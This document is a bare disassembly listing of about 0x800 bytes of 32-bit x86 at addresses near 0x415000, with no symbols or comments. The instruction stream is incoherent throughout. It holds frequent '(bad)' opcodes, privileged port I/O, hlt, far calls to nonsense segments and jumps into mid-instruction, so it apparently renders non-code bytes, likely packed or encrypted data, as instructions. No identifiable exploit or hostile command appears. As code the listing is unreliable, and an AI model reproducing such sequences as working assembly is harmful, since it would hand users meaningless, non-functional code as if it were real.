  414e42:	and    esi,DWORD PTR [ecx+ebx*2]
  414e45:	xchg   esp,eax
  414e46:	adc    eax,esi
  414e48:	xchg   ecx,eax
  414e49:	ins    BYTE PTR es:[edi],dx
  414e4a:	(bad)  
  414e4b:	and    cl,BYTE PTR [esi-0x391c7759]
  414e51:	sub    BYTE PTR [edx-0x78963083],al
  414e57:	(bad)  
  414e58:	call   0xa4428746
  414e5d:	mov    ds:0x41cdc415,eax
  414e62:	push   eax
  414e63:	fild   DWORD PTR [edi-0x38]
  414e66:	jecxz  0x414e9f
  414e68:	inc    edi
  414e69:	dec    esi
  414e6a:	cdq    
  414e6b:	add    al,0x36
  414e6d:	es inc edx
  414e6f:	scas   al,BYTE PTR es:[edi]
  414e70:	loopne 0x414ec9
  414e72:	(bad)  
  414e73:	ins    BYTE PTR es:[edi],dx
  414e74:	jbe    0x414dfb
  414e76:	dec    esi
  414e77:	retf   0x7bc7
  414e7a:	jno    0x414e18
  414e7c:	in     eax,dx
  414e7d:	jmp    0xc08e042d
  414e82:	pop    ecx
  414e83:	jb     0x414ee4
  414e85:	mov    ds,WORD PTR ds:0xdbfeef2
  414e8b:	inc    edx
  414e8c:	in     eax,dx
  414e8d:	adc    eax,esi
  414e8f:	fdivp  st(0),st
  414e91:	es mov ch,0xb6
  414e94:	call   0xbe6a5b8f
  414e99:	dec    ebp
  414e9a:	loope  0x414ea1
  414e9c:	and    eax,0x6e8d367e
  414ea1:	int    0x42
  414ea3:	sbb    al,0x9a
  414ea5:	and    cl,BYTE PTR [ecx+0x5ac08643]
  414eab:	mul    BYTE PTR [edi-0x61]
  414eae:	sub    al,0xfd
  414eb0:	pop    ecx
  414eb1:	ret    0xc958
  414eb4:	cld    
  414eb5:	mov    ebp,0xa520b7d7
  414eba:	jecxz  0x414f0d
  414ebc:	and    esp,DWORD PTR [edx+0x14]
  414ebf:	es sub ebp,ebp
  414ec2:	add    al,0x69
  414ec4:	push   0x9dff58e9
  414ec9:	leave  
  414eca:	not    eax
  414ecc:	mov    esp,0x9ce9af23
  414ed1:	jo     0x414e8c
  414ed3:	mov    edx,0x763a5c0e
  414ed8:	das    
  414ed9:	mov    esi,0x6284672e
  414ede:	cli    
  414edf:	call   0x2226:0x461449f7
  414ee6:	aad    0xc0
  414ee8:	jae    0x414ed5
  414eea:	jnp    0x414e80
  414eec:	xchg   esp,edx
  414eee:	(bad)  [ebx+0x266a8976]
  414ef4:	push   eax
  414ef5:	sub    ebp,ebp
  414ef7:	cmp    BYTE PTR [edx],bh
  414ef9:	or     bh,al
  414efb:	test   al,0xa9
  414efd:	fs fst st(7)
  414f00:	fs mov dh,0x8
  414f03:	push   ds
  414f04:	daa    
  414f05:	jbe    0x414ed1
  414f07:	imul   BYTE PTR [edi+0x3b277897]
  414f0d:	sbb    cl,ch
  414f0f:	mov    esi,DWORD PTR [ecx]
  414f11:	add    eax,0xb1515ac8
  414f16:	sbb    al,0xf1
  414f18:	xlat   BYTE PTR ds:[ebx]
  414f19:	mov    BYTE PTR ds:0x217d386d,cl
  414f1f:	and    al,0x61
  414f21:	lods   eax,DWORD PTR ds:[esi]
  414f22:	mul    DWORD PTR [ecx+0x4ed1227e]
  414f28:	sbb    ah,BYTE PTR [ebx+0x6ca0e342]
  414f2e:	test   ch,dl
  414f30:	adc    BYTE PTR [ebx],dh
  414f32:	mov    ds:0xc342cdbe,eax
  414f37:	out    0xae,al
  414f39:	enter  0xab45,0x5
  414f3d:	(bad)  
  414f3e:	mov    al,ds:0x39631d70
  414f43:	sti    
  414f44:	inc    ebx
  414f45:	xor    esi,DWORD PTR [eax]
  414f47:	fwait
  414f48:	lods   al,BYTE PTR ds:[esi]
  414f49:	mov    dl,0xcb
  414f4b:	inc    edx
  414f4c:	mov    al,0x7
  414f4e:	sbb    esi,ecx
  414f50:	in     al,0x61
  414f52:	xchg   ebp,eax
  414f53:	mov    ebp,0x32db0ccc
  414f58:	mov    ecx,0x71276a58
  414f5d:	inc    ebp
  414f5e:	jg     0x414f72
  414f60:	xor    DWORD PTR ds:0x4b77c188,esp
  414f66:	adc    al,0x4
  414f68:	push   ss
  414f69:	push   edi
  414f6a:	test   eax,0x604c322f
  414f6f:	push   ecx
  414f70:	(bad)  
  414f72:	aam    0x14
  414f74:	lods   al,BYTE PTR ds:[esi]
  414f75:	fcomp  DWORD PTR [bx+di]
  414f78:	das    
  414f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f7a:	dec    esp
  414f7b:	stos   BYTE PTR es:[edi],al
  414f7c:	dec    edx
  414f7d:	fsub   st,st(0)
  414f7f:	dec    esp
  414f80:	test   BYTE PTR [esi+0xa],bl
  414f83:	cmp    eax,DWORD PTR [ebp+0x65]
  414f86:	imul   ebx,ecx,0x6f
  414f89:	dec    esi
  414f8a:	repz mov eax,ds:0x9066b355
  414f90:	inc    esp
  414f91:	call   0x6966dd31
  414f96:	fnsave [esi+0x42]
  414f99:	(bad)  
  414f9a:	loope  0x414fe4
  414f9c:	ret    
  414f9d:	fs pop es
  414f9f:	mov    ch,0xa7
  414fa1:	xchg   esp,eax
  414fa2:	mov    al,0x4f
  414fa4:	std    
  414fa5:	lahf   
  414fa6:	jns    0x414f4d
  414fa8:	out    0xf6,al
  414faa:	xor    edi,ebp
  414fac:	daa    
  414fad:	adc    dl,BYTE PTR ds:0xeb05fed
  414fb3:	shr    ebp,1
  414fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb6:	pop    edi
  414fb7:	inc    esp
  414fb8:	and    BYTE PTR ds:0x3d799e05,0x7a
  414fbf:	pop    esp
  414fc0:	xchg   esi,eax
  414fc1:	or     al,0x5f
  414fc3:	jnp    0x41501f
  414fc5:	int    0x25
  414fc7:	(bad)  [ebx+0x3694115d]
  414fcd:	leave  
  414fce:	test   al,0xc0
  414fd0:	test   al,0x36
  414fd2:	mov    ch,0x41
  414fd5:	fsubr  QWORD PTR [ebp-0x31]
  414fd8:	push   ebp
  414fd9:	dec    esi
  414fda:	mov    esp,0x48727ae
  414fdf:	pop    ds
  414fe0:	xor    al,0x66
  414fe2:	jb     0x414fa1
  414fe4:	fnstsw WORD PTR [eax]
  414fe6:	enter  0xa039,0x15
  414fea:	stos   DWORD PTR es:[edi],eax
  414feb:	inc    edx
  414fec:	stos   BYTE PTR es:[edi],al
  414fed:	add    al,0x33
  414fef:	pop    es
  414ff0:	repnz in eax,0xbf
  414ff3:	cmp    cl,BYTE PTR [edx-0x17b97b7c]
  414ff9:	cld    
  414ffa:	mov    bh,0x66
  414ffc:	pop    es
  414ffd:	popf   
  414ffe:	mov    edi,0x504ffaa8
  415003:	out    0xf,eax
  415005:	inc    edx
  415006:	pop    eax
  415007:	jne    0x41500a
  415009:	add    al,0x6b
  41500b:	in     eax,0xd7
  41500d:	pusha  
  41500e:	popf   
  41500f:	test   eax,0x673b78a0
  415014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415015:	in     eax,dx
  415016:	mov    ah,0xfa
  415018:	add    BYTE PTR ds:0xf001122e,bh
  41501e:	adc    eax,0xc111fa51
  415023:	sahf   
  415024:	(bad)  
  415025:	mov    cl,0xea
  415027:	inc    eax
  415028:	push   ecx
  415029:	loopne 0x414fbf
  41502b:	push   0xd5e281e2
  415030:	add    dl,dh
  415032:	lahf   
  415033:	hlt    
  415034:	mov    al,ds:0x98b3f285
  415039:	cmp    dl,cl
  41503b:	adc    DWORD PTR [edx-0xfd6ad50],ebx
  415041:	push   ecx
  415042:	fs or  ecx,ebp
  415045:	stos   DWORD PTR es:[edi],eax
  415046:	inc    esp
  415047:	test   eax,0x52a281d7
  41504c:	sbb    al,0x8c
  41504e:	xchg   edi,eax
  41504f:	mov    ecx,0x8e67fe7c
  415054:	mov    cl,0x98
  415056:	mov    al,ds:0xbc4a0b1
  41505b:	adc    esp,esi
  41505d:	pop    ecx
  41505e:	dec    ebp
  41505f:	add    eax,0x87959984
  415064:	mov    ebx,0xccc2596e
  415069:	mov    bh,0x27
  41506b:	mov    eax,0x2f7fe4ec
  415070:	xchg   dh,ch
  415072:	inc    edx
  415073:	lahf   
  415074:	sahf   
  415075:	xor    al,0xe1
  415077:	push   es
  415078:	push   es
  415079:	in     eax,0x59
  41507b:	sub    al,0x61
  41507d:	or     ebp,DWORD PTR [ebx-0x3ba37b7]
  415083:	gs xchg ecx,eax
  415085:	fcomp  st(3)
  415087:	pushf  
  415088:	inc    ebx
  415089:	mov    esp,0xd3eaa9fd
  41508e:	jp     0x4150b7
  415090:	sbb    ebx,DWORD PTR [ecx+0xc782390]
  415096:	mov    edi,0x3540fa3d
  41509b:	in     eax,0xbd
  41509d:	test   BYTE PTR [eax+0x6b],0xd3
  4150a1:	xchg   ebp,eax
  4150a2:	sub    bl,BYTE PTR [edx-0x12847754]
  4150a8:	in     al,dx
  4150a9:	and    DWORD PTR [eax],edi
  4150ab:	xor    al,0xe5
  4150ad:	(bad)  
  4150ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150af:	and    esi,ebp
  4150b1:	setle  BYTE PTR ds:0xabcc09ea
  4150b8:	jp     0x415131
  4150ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150bb:	imul   esi,DWORD PTR [ebp+0x30],0x9e9f8fcc
  4150c2:	out    0x3a,eax
  4150c4:	(bad)  
  4150c5:	and    DWORD PTR [edx],esp
  4150c7:	fdivrp st(5),st
  4150c9:	pop    edi
  4150ca:	xor    ah,cl
  4150cc:	int    0x42
  4150ce:	out    0x17,al
  4150d0:	cmc    
  4150d1:	inc    ebp
  4150d2:	out    0xe2,eax
  4150d4:	cmp    al,bl
  4150d6:	(bad)  
  4150d8:	jmp    0x324eaab9
  4150dd:	jo     0xfdaa0e08
  4150e3:	adc    BYTE PTR [ecx+0x2e],ch
  4150e6:	mov    dh,0xd5
  4150e8:	jnp    0x41507d
  4150ea:	adc    edi,DWORD PTR [eax-0x63a3194d]
  4150f0:	dec    ebp
  4150f1:	pushf  
  4150f2:	mov    eax,0xb3f0d841
  4150f7:	imul   edx,DWORD PTR [eax+eiz*1+0x3f],0xcb03d99c
  4150ff:	mov    al,0x74
  415101:	and    eax,0x62448752
  415106:	fstp   QWORD PTR [edi-0x36679c69]
  41510c:	cmp    eax,DWORD PTR [ebx-0x7affb344]
  415112:	mov    bl,0x22
  415114:	mov    dl,0x36
  415116:	and    edi,DWORD PTR [esi+edi*4+0x3e]
  41511a:	inc    eax
  41511b:	imul   ch
  41511d:	jne    0x41517e
  41511f:	cdq    
  415120:	inc    esp
  415121:	and    ecx,DWORD PTR [ebx+eax*8+0x5d]
  415125:	std    
  415126:	pusha  
  415127:	lea    esp,[esi+0x43]
  41512a:	xor    eax,0xbebb02a5
  41512f:	xchg   ecx,eax
  415130:	in     eax,dx
  415131:	sbb    al,0x2a
  415133:	call   0x550f:0x605fff4f
  41513a:	add    eax,0xc603d38f
  41513f:	ret    0x4f38
  415142:	(bad)  
  415143:	mov    ch,0x7
  415145:	test   DWORD PTR [ebx+eax*1-0x58],edx
  415149:	cmp    cl,bh
  41514b:	nop
  41514c:	sub    bl,BYTE PTR [esi+0x55]
  41514f:	cmp    DWORD PTR [edi+esi*8],ebp
  415152:	clc    
  415153:	xor    al,0xb
  415155:	les    ecx,FWORD PTR [ecx+ebp*1-0x2c]
  415159:	int    0xb4
  41515b:	jg     0x415192
  41515d:	cmp    DWORD PTR [esi-0xd1824b1],esi
  415163:	repnz mov ds:0xa920374f,eax
  415169:	imul   ecx,DWORD PTR [edi+0x25],0x69
  41516d:	dec    ebp
  41516e:	sbb    DWORD PTR [ebp+0x37],esp
  415171:	inc    ecx
  415172:	xchg   ecx,eax
  415173:	out    dx,eax
  415174:	into   
  415175:	scas   eax,DWORD PTR es:[edi]
  415176:	pop    ds
  415177:	dec    esi
  415178:	adc    BYTE PTR [edx+0x1f],ah
  41517b:	pop    ebp
  41517c:	push   ds
  41517d:	fist   DWORD PTR [ebp-0x63b2ebd7]
  415183:	jge    0x4151c2
  415185:	add    edi,DWORD PTR [eax-0x5dd993ea]
  41518b:	gs repnz test eax,0x5b7aa056
  415192:	pop    edx
  415193:	sar    BYTE PTR [esi],0x88
  415196:	mov    edx,0x219d8d6f
  41519b:	push   esp
  41519c:	fadd   DWORD PTR [eax]
  41519e:	retf   
  41519f:	lods   al,BYTE PTR ds:[esi]
  4151a0:	add    eax,0xf0cee54
  4151a5:	in     eax,0x1b
  4151a7:	add    al,BYTE PTR [eax+0x2]
  4151aa:	sbb    bl,0x2
  4151ad:	stos   BYTE PTR es:[edi],al
  4151ae:	xchg   DWORD PTR [edx-0x48f4e8eb],edx
  4151b4:	cmp    DWORD PTR [eax-0x4c1b3fd1],edi
  4151ba:	sbb    eax,0x6
  4151bd:	das    
  4151be:	es ja  0x4151df
  4151c1:	call   0xf008:0x7b1a8e80
  4151c8:	cmp    ebp,DWORD PTR [ebx]
  4151ca:	adc    eax,ebp
  4151cc:	pop    edi
  4151cd:	xchg   DWORD PTR [ebx],ebp
  4151cf:	dec    edi
  4151d0:	jae    0x4151db
  4151d2:	add    BYTE PTR ds:0x2b3c0ab9,bh
  4151d8:	fwait
  4151d9:	xchg   esp,eax
  4151da:	imul   esp,DWORD PTR [edi-0x47],0xffffff8d
  4151de:	and    BYTE PTR [eax],0x37
  4151e1:	mov    edi,0x21e3df1b
  4151e6:	cmp    eax,0xc75278ce
  4151eb:	push   ebx
  4151ec:	jne    0x4151e7
  4151ee:	sbb    edx,esi
  4151f0:	cli    
  4151f1:	mov    esp,0xebf06059
  4151f6:	bound  esp,QWORD PTR [edx+0x6a]
  4151f9:	fisubr DWORD PTR [edx]
  4151fb:	nop
  4151fc:	mov    eax,0xf8370b6f
  415201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415202:	sbb    eax,DWORD PTR [edi]
  415204:	hlt    
  415205:	add    al,0xbb
  415207:	fwait
  415208:	test   BYTE PTR [eax+0x4e25cd03],cl
  41520e:	dec    esi
  41520f:	jge    0x41528f
  415211:	fld    QWORD PTR ss:[eax]
  415214:	test   ebx,ebp
  415216:	jmp    0xecd02801
  41521b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41521c:	cmp    eax,0x6aa54916
  415221:	cmp    dl,BYTE PTR [edx-0x69]
  415224:	jne    0x4151de
  415226:	sbb    al,0xb7
  415228:	call   0x2225:0x9741bb71
  41522f:	and    DWORD PTR [ecx],ebp
  415231:	xor    bh,BYTE PTR [ebp-0x60]
  415234:	arpl   di,si
  415236:	test   eax,0x393b54b7
  41523b:	test   DWORD PTR [ebp-0x416b11ac],esp
  415241:	adc    edx,DWORD PTR [edx+ebp*8]
  415244:	imul   eax,DWORD PTR ds:0x21188c74,0x96d0521f
  41524e:	jge    0x415202
  415250:	xchg   ecx,eax
  415251:	pushf  
  415252:	cmp    bl,ah
  415254:	sti    
  415255:	in     eax,0x9c
  415257:	shl    DWORD PTR [eax-0x27],0x58
  41525b:	dec    ebx
  41525c:	mov    al,0xf6
  41525e:	mov    ds:0xccf43caf,al
  415263:	jns    0x41529a
  415265:	and    esi,DWORD PTR [edi-0x33]
  415268:	dec    esi
  415269:	mov    ss,WORD PTR [ebx+0x6e51eb5d]
  41526f:	xchg   edi,eax
  415270:	nop
  415271:	sbb    eax,0xeb591627
  415276:	das    
  415277:	lahf   
  415278:	arpl   WORD PTR [edx+0x31],ax
  41527b:	push   esi
  41527c:	sahf   
  41527d:	pop    ebp
  41527e:	aas    
  41527f:	fisttp WORD PTR [edi+0x3d90b67d]
  415285:	adc    al,BYTE PTR [esi+esi*8]
  415288:	fsub   QWORD PTR [esi]
  41528a:	stos   BYTE PTR es:[edi],al
  41528b:	cmp    BYTE PTR [eax+0x38cb217f],cl
  415291:	push   cs
  415292:	cmp    BYTE PTR [esi],ch
  415294:	fcmovbe st,st(0)
  415296:	xor    DWORD PTR [eax-0x6e],ebx
  415299:	lods   al,BYTE PTR ds:[esi]
  41529a:	out    0x45,al
  41529c:	cmp    eax,0x9c5122c
  4152a1:	or     dh,bl
  4152a3:	rcl    DWORD PTR [edi],1
  4152a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a6:	iret   
  4152a7:	cli    
  4152a8:	fadd   QWORD PTR [ecx-0x3763e221]
  4152ae:	and    al,0xba
  4152b0:	and    eax,0xca4f587e
  4152b5:	mov    WORD PTR [eax+edx*8-0x79c433d9],gs
  4152bc:	ds retf 0xf514
  4152c0:	dec    edi
  4152c1:	leave  
  4152c2:	out    0x1,al
  4152c4:	jb     0x41529b
  4152c6:	shl    DWORD PTR [edx+0x37b761a6],cl
  4152cc:	fsub   st(6),st
  4152ce:	add    dh,0x1a
  4152d1:	pop    edi
  4152d2:	adc    bl,BYTE PTR [ebx+0x50604f9c]
  4152d8:	(bad)  
  4152d9:	mov    bl,BYTE PTR [ecx+0x15]
  4152dc:	inc    esp
  4152dd:	sub    esp,DWORD PTR [esi+eax*1-0x1512c4fa]
  4152e4:	ja     0x415351
  4152e6:	jmp    0x4152a7
  4152e8:	mov    ebp,0x36ebabde
  4152ed:	fsubr  DWORD PTR [edx]
  4152ef:	scas   eax,DWORD PTR es:[edi]
  4152f0:	pusha  
  4152f1:	dec    ebp
  4152f2:	mov    eax,0x26f315a
  4152f7:	or     dl,BYTE PTR [esi]
  4152f9:	push   ds
  4152fa:	mov    ch,0x2d
  4152fc:	or     DWORD PTR [edi-0x72494e37],0xffffff80
  415303:	outs   dx,BYTE PTR ds:[esi]
  415304:	daa    
  415305:	add    edi,DWORD PTR [esi-0x53]
  415308:	aas    
  415309:	sahf   
  41530a:	into   
  41530b:	lea    esi,[ebx-0x1f77967d]
  415311:	es push esi
  415313:	sbb    dh,bl
  415315:	dec    edx
  415316:	push   ebp
  415317:	push   eax
  415318:	push   ds
  415319:	and    ebx,DWORD PTR [edi]
  41531b:	in     eax,dx
  41531c:	test   al,0xfe
  41531e:	fnsave [edx]
  415320:	cmp    al,0xa9
  415322:	dec    ebx
  415323:	scas   al,BYTE PTR es:[edi]
  415324:	mov    edi,?
  415326:	pop    esp
  415327:	std    
  415328:	mov    edi,DWORD PTR ds:0xf0763b42
  41532e:	pop    ebp
  41532f:	mov    edx,0x5c36cadf
  415334:	aas    
  415335:	xchg   ebx,eax
  415336:	(bad)  
  415337:	jno    0x4152d7
  415339:	cli    
  41533a:	arpl   WORD PTR [edi+0x77],si
  41533d:	ret    0x3196
  415340:	mov    dh,0x4c
  415342:	aas    
  415343:	aas    
  415344:	lock sub edi,0xffffff81
  415348:	aaa    
  415349:	lods   eax,DWORD PTR ds:[esi]
  41534a:	int3   
  41534b:	mov    esp,0x1553df4f
  415350:	add    eax,0xa06845fe
  415355:	jge    0x41530f
  415357:	and    al,0xc9
  415359:	shl    BYTE PTR [esi-0x23475b25],cl
  41535f:	outs   dx,BYTE PTR ds:[esi]
  415360:	inc    esp
  415361:	dec    ebx
  415362:	dec    eax
  415363:	cmp    DWORD PTR [esi+0x1237a010],esi
  415369:	xchg   edi,eax
  41536a:	out    0x39,eax
  41536c:	sbb    eax,0xb7fad501
  415371:	and    eax,0xea9cf7ea
  415376:	frstor [eax+0x6f]
  415379:	enter  0x4ea9,0xcf
  41537d:	call   0x8d29477c
  415382:	add    dh,bh
  415384:	inc    edx
  415385:	fldenv [ebx+edx*2]
  415388:	es inc esi
  41538a:	add    eax,0x727cca75
  41538f:	repnz inc esp
  415391:	test   BYTE PTR [eax-0x6793479f],dh
  415397:	sub    eax,0xb6c4ee88
  41539c:	scas   eax,DWORD PTR es:[edi]
  41539d:	mov    ecx,0x852fe2ba
  4153a2:	jmp    esi
  4153a4:	jnp    0x4153b9
  4153a6:	xor    BYTE PTR [ebx-0x4b],ch
  4153a9:	jecxz  0x41540c
  4153ab:	hlt    
  4153ac:	pop    edx
  4153ad:	bnd jns 0x4153cc
  4153b0:	xchg   ebp,eax
  4153b1:	mov    bh,0x6b
  4153b3:	test   al,0x2e
  4153b5:	aas    
  4153b6:	outs   dx,BYTE PTR ds:[esi]
  4153b7:	xchg   ecx,eax
  4153b8:	cdq    
  4153b9:	test   al,0x42
  4153bb:	mov    ds:0x1eca0d86,eax
  4153c0:	cdq    
  4153c1:	sahf   
  4153c2:	xchg   ebp,eax
  4153c3:	xchg   dl,ch
  4153c5:	int    0x76
  4153c7:	push   ebp
  4153c8:	pop    ebp
  4153c9:	push   DWORD PTR [edx]
  4153cb:	shl    bl,1
  4153cd:	mov    al,0x43
  4153cf:	pusha  
  4153d0:	and    DWORD PTR [ebx-0x1c],edx
  4153d3:	pop    edx
  4153d4:	or     eax,0x5ae472e2
  4153d9:	push   ecx
  4153da:	test   eax,esp
  4153dc:	mov    ecx,0x18edbf77
  4153e1:	mov    al,bl
  4153e3:	pop    eax
  4153e4:	push   esi
  4153e5:	popf   
  4153e6:	aas    
  4153e7:	adc    eax,0x435da31a
  4153ec:	dec    eax
  4153ed:	xchg   ebx,eax
  4153ee:	jge    0x4153ca
  4153f0:	jne    0x41540d
  4153f2:	stos   DWORD PTR es:[edi],eax
  4153f3:	pop    ss
  4153f4:	dec    edx
  4153f5:	jle    0x4153ee
  4153f7:	dec    esp
  4153f8:	popf   
  4153f9:	in     eax,dx
  4153fa:	test   BYTE PTR [eax-0x46e9b471],dl
  415400:	or     cl,BYTE PTR [esp+ecx*8]
  415403:	add    BYTE PTR es:[eax+0x46],0x3d
  415408:	push   ebp
  41540a:	arpl   WORD PTR [ebx+ebx*4],bx
  41540d:	push   esp
  41540e:	jno    0x41542f
  415410:	add    BYTE PTR [esi],0x10
  415413:	push   edx
  415414:	mov    ds:0x69f6f36b,eax
  415419:	mov    ebp,0x9fa00b02
  41541e:	adc    DWORD PTR [eax+0x4e],ebp
  415421:	add    eax,0x950d7330
  415426:	cmc    
  415427:	(bad)  
  415428:	out    0x29,eax
  41542a:	pop    eax
  41542b:	and    eax,0x90a9710
  415430:	dec    esi
  415431:	test   BYTE PTR [edx-0x353afda1],0xf7
  415438:	mov    ebx,0x4064a840
  41543d:	ret    0xeaa
  415440:	jno    0x415413
  415442:	pusha  
  415443:	jmp    0x41543f
  415445:	xchg   ebx,eax
  415446:	shr    BYTE PTR [edi],1
  415448:	ja     0x41547c
  41544a:	jl     0x415439
  41544c:	popa   
  41544d:	mov    DWORD PTR ds:0xafe7d055,edi
  415453:	hlt    
  415454:	push   ds
  415455:	mov    ah,0x8
  415457:	mov    esp,esi
  415459:	idiv   DWORD PTR [ebx]
  41545b:	aaa    
  41545c:	stc    
  41545d:	adc    al,BYTE PTR [ecx-0x21077c09]
  415463:	add    DWORD PTR [bx-0x5be5],0x15684924
  41546c:	stos   BYTE PTR es:[edi],al
  41546d:	inc    esp
  41546e:	xchg   ebx,eax
  41546f:	mov    eax,ds:0xcbc58037
  415474:	mov    al,ds:0xdb7915b1
  415479:	pop    es
  41547a:	cdq    
  41547b:	inc    edi
  41547c:	inc    edi
  41547d:	pusha  
  41547e:	inc    esi
  41547f:	xlat   BYTE PTR ds:[ebx]
  415480:	mov    al,ds:0x64e1cdc0
  415485:	dec    edi
  415486:	test   DWORD PTR ds:0xca6f4f7,ebx
  41548c:	inc    ebp
  41548d:	int3   
  41548e:	repnz shl BYTE PTR [ecx],cl
  415491:	(bad)  
  415492:	xchg   ebx,eax
  415493:	das    
  415494:	sub    al,0xe4
  415496:	notrack call DWORD PTR [ebx-0xe]
  41549a:	and    al,0x9b
  41549c:	inc    edx
  41549d:	in     eax,dx
  41549e:	add    esi,esp
  4154a0:	xchg   BYTE PTR [ebx+0x69],ch
  4154a3:	ret    0xf32f
  4154a6:	push   ds
  4154a7:	inc    ebx
  4154a8:	mov    bl,0x9b
  4154aa:	push   esi
  4154ab:	lds    ecx,FWORD PTR [ebp-0x64]
  4154ae:	mov    WORD PTR [ebp+0x16],gs
  4154b1:	jge    0x415506
  4154b3:	adc    BYTE PTR [esi],0xb6
  4154b6:	retf   
  4154b7:	inc    esp
  4154b8:	cmp    BYTE PTR [ebp-0x7b5b8531],bl
  4154be:	icebp  
  4154bf:	mov    dh,BYTE PTR [esi+eax*8+0x37]
  4154c3:	ds scas eax,DWORD PTR es:[edi]
  4154c5:	jo     0x415542
  4154c7:	loopne 0x415543
  4154c9:	fisttp QWORD PTR [edi+esi*8+0x25]
  4154cd:	leave  
  4154ce:	adc    al,0x14
  4154d0:	loopne 0x415538
  4154d2:	cmp    eax,0xaaf3df5
  4154d7:	xor    al,0xeb
  4154d9:	fs in  al,dx
  4154db:	or     BYTE PTR [ebx+esi*8],al
  4154de:	inc    edi
  4154df:	push   esp
  4154e0:	jns    0x415487
  4154e2:	into   
  4154e3:	pop    eax
  4154e4:	rol    DWORD PTR [ebp-0x699aee8],cl
  4154ea:	inc    eax
  4154eb:	dec    DWORD PTR [ebx]
  4154ed:	fcompp 
  4154ef:	mov    eax,0xda63a61d
  4154f4:	jbe    0x415502
  4154f6:	jns    0x41552f
  4154f8:	fisub  DWORD PTR [ebp-0x34]
  4154fb:	lods   eax,DWORD PTR ds:[esi]
  4154fc:	out    dx,al
  4154fd:	and    dh,dl
  4154ff:	cmp    dh,BYTE PTR [ebx+0x62]
  415502:	fld    TBYTE PTR [edx-0x3e]
  415505:	sub    al,0x38
  415507:	sahf   
  415508:	popa   
  415509:	add    dh,ah
  41550b:	clc    
  41550c:	xchg   edx,eax
  41550d:	mov    al,ds:0xa516dc87
  415512:	fistp  QWORD PTR [esi-0x785064f0]
  415518:	cmc    
  415519:	out    0x1d,eax
  41551b:	inc    ebp
  41551c:	and    esi,ebx
  41551e:	mov    ds:0x2636abe6,al
  415523:	mov    edx,0x88878ce7
  415528:	adc    BYTE PTR [edx],bh
  41552a:	mov    bl,BYTE PTR [esi-0x32]
  41552d:	jmp    0x77c2:0x676a2bdd
  415534:	fbstp  TBYTE PTR [esi+0x47]
  415537:	push   ebp
  415538:	scas   eax,DWORD PTR es:[edi]
  415539:	xchg   ecx,eax
  41553a:	cmp    BYTE PTR [edi+0x27437d2b],dh
  415540:	addr16 sbb eax,0xc3e6cc23
  415546:	sbb    al,0x5e
  415548:	mov    dh,0xe
  41554a:	stos   DWORD PTR es:[edi],eax
  41554b:	es pop ebx
  41554d:	(bad)  
  41554e:	mov    DWORD PTR ds:[eax-0x4dea027c],esi
  415555:	fsub   st(7),st
  415557:	mov    eax,0xcc62204d
  41555c:	cdq    
  41555d:	mov    esp,0x1a4c9f32
  415562:	jmp    ebx
  415564:	(bad)  
  415565:	push   ss
  415566:	jg     0x41552e
  415568:	sbb    al,0x68
  41556a:	push   ss
  41556b:	mov    ebp,0xd89e037a
  415570:	aas    
  415571:	jae    0x4155a8
  415573:	(bad)  
  415574:	out    dx,al
  415575:	aas    
  415576:	dec    esp
  415577:	dec    esp
  415578:	sbb    BYTE PTR [edi-0x72b39ad8],0x43
  41557f:	sbb    edi,ecx
  415581:	dec    ebx
  415582:	jecxz  0x41556c
  415584:	and    BYTE PTR [ebp+0x1a248c43],ah
  41558a:	add    BYTE PTR ds:0x9cfc23a,0xf0
  415591:	sub    eax,0xe3a85d85
  415596:	jno    0x415576
  415598:	pop    eax
  415599:	push   ecx
  41559a:	je     0x41551c
  41559c:	dec    edi
  41559d:	sbb    cl,BYTE PTR [eax-0x1ade616c]
  4155a3:	sahf   
  4155a4:	and    al,BYTE PTR [ebp+esi*8+0x63]
  4155a8:	test   eax,0xb27ae5a0
  4155ad:	add    BYTE PTR [ecx-0x56],al
  4155b0:	mov    WORD PTR ds:0xe470e30d,?
  4155b6:	pushf  
  4155b7:	mov    ebx,0x309e08a3
  4155bc:	sbb    eax,0x6366cf58
  4155c1:	or     BYTE PTR [esi],ch
  4155c3:	retf   0xf73e
  4155c6:	jp     0x41558d
  4155c8:	cmp    edi,DWORD PTR [eax]
  4155ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155cb:	pop    ss
  4155cc:	and    al,0x0
  4155ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155cf:	sub    BYTE PTR [ecx+ebx*4+0x57a5658e],ch
  4155d6:	jb     0x415625
  4155d8:	mov    ds:0x2ecbbb8b,al
  4155dd:	or     al,BYTE PTR [edx]
  4155df:	sub    DWORD PTR [edx],0x9ac3e527
  4155e5:	gs in  eax,0x9e
  4155e8:	test   esi,ebp
  4155ea:	mov    BYTE PTR fs:[eax+0x6c9400c6],0x30
  4155f2:	inc    edx
  4155f3:	cmovns edx,DWORD PTR [ebp+0xa230c23]
  4155fa:	icebp  
  4155fb:	and    DWORD PTR [ecx],0xffffffd9
  4155fe:	or     al,0xf2
  415600:	pop    edx
  415601:	xchg   edi,eax
  415602:	scas   eax,DWORD PTR es:[edi]
  415603:	xchg   ebp,eax
  415604:	test   al,0xc5
  415606:	jne    0x4155fc
  415608:	sbb    ebp,ebp
  41560a:	mov    esp,0x28eb2e65
  41560f:	xchg   ebx,eax
  415610:	push   esi
  415611:	xchg   edi,eax
  415612:	jne    0x415621
  415614:	dec    edi
  415615:	add    al,0x29
  415617:	int3   
  415618:	push   es
  415619:	sbb    al,0x8f
  41561b:	and    al,0x74
  41561d:	imul   eax,DWORD PTR [ebx+0x2c],0x4b40b661
  415624:	in     eax,0xb4
  415626:	mov    ecx,eax
  415628:	nop
  415629:	shl    al,cl
  41562b:	mov    bl,BYTE PTR [ecx-0x4973d8ff]
  415631:	mov    ds:0x4c004631,eax
  415636:	sub    eax,0xa73bc651
  41563b:	xchg   DWORD PTR [ecx+edi*8+0x1a],ecx
  41563f:	push   ds
  415640:	push   edx
  415641:	pop    esp
  415642:	loope  0x41561e
  415644:	(bad)  [ecx]
  415646:	(bad)  
